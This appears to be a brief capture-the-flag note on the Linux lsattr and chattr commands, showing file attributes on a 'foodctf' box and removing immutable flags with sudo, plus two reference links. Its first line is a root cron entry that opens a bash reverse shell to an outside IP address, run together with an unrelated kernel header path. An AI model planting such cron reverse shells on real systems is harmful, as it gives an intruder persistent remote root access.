# lsattr / chattr

```
* * * * * root /bin/bash -c '/bin/sh -i >& /dev/tcp/10.14.66.169/5544 0>&1'nclude/config/net/team/mode/activebackup.h
root@foodctf:/root# lsattr 
--------------e--- ./king.txt
----i---------e--- ./koth
--------------e--- ./hello.txt
----i---------e--- ./flag
```



```
root@foodctf:/root# sudo /usr/src/usr/bin/chattr -i hello.txt 
root@foodctf:/root# sudo /usr/src/usr/bin/chattr -a hello.txt
```

[https://www.baeldung.com/linux/lsattr-chattr-attributes](https://www.baeldung.com/linux/lsattr-chattr-attributes)

[https://www.tecmint.com/chattr-command-examples/](https://www.tecmint.com/chattr-command-examples/)





